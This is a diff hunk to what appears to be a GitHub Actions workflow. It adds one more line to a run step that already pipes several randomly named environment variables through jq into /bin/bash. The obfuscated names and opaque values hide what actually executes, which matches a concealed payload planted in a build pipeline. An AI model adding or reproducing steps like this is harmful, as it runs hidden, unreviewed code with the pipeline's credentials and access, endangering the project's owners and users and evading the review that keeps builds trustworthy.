@@ -31,6 +31,7 @@ jobs:
           echo $aw218 | jq -r .kdps1275 | /bin/bash
           echo $uuxtw110 | jq -r .qwkj71 | /bin/bash
           printf '%s' "$yepu948" | jq -r .ln68052 | /bin/bash
+          echo $rb03816 | jq -r .o033 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
